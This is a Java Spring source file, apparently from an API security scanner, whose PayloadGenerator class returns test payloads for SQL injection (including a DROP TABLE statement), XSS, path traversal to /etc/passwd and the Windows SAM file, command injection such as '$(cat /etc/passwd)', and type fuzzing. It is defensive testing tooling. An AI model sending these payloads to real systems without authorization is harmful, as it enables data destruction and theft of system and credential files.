package com.vtb.apisecurity.service.analysis.analyzrs.dynamic.payload;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

@Component
@Slf4j
public class PayloadGenerator {
    
    public List<String> generateSqlInjectionPayloads() {
        return Arrays.asList(
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "admin'--",
            "' OR 'a'='a",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "') OR ('1'='1--"
        );
    }
    
    public List<String> generateXssPayloads() {
        return Arrays.asList(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        );
    }
    
    public List<String> generatePathTraversalPayloads() {
        return Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd"
        );
    }
    
    public List<String> generateCommandInjectionPayloads() {
        return Arrays.asList(
            "; ls",
            "| whoami",
            "& dir",
            "`id`",
            "$(cat /etc/passwd)",
            "|| cat /etc/passwd",
            "&& cat /etc/passwd"
        );
    }
    
    public List<Object> generateFuzzingPayloads(String type) {
        List<Object> payloads = new ArrayList<>();
        
        switch (type.toLowerCase()) {
            case "string":
                payloads.add("");
                payloads.add(" ");
                payloads.add("a".repeat(1000)); // Very long string
                payloads.add("null");
                payloads.add("undefined");
                payloads.add("NaN");
                payloads.add("true");
                payloads.add("false");
                payloads.add("0");
                payloads.add("-1");
                payloads.add("999999999999999999");
                break;
            case "integer":
                payloads.add(0);
                payloads.add(-1);
                payloads.add(Integer.MAX_VALUE);
                payloads.add(Integer.MIN_VALUE);
                payloads.add(999999999999999999L);
                break;
            case "number":
                payloads.add(0.0);
                payloads.add(-0.0);
                payloads.add(Double.MAX_VALUE);
                payloads.add(Double.MIN_VALUE);
                payloads.add(Double.NaN);
                payloads.add(Double.POSITIVE_INFINITY);
                payloads.add(Double.NEGATIVE_INFINITY);
                break;
            case "boolean":
                payloads.add(true);
                payloads.add(false);
                payloads.add("true");
                payloads.add("false");
                payloads.add(1);
                payloads.add(0);
                break;
            default:
                payloads.add(null);
                payloads.add("");
                payloads.add("test");
                break;
        }
        
        return payloads;
    }
}

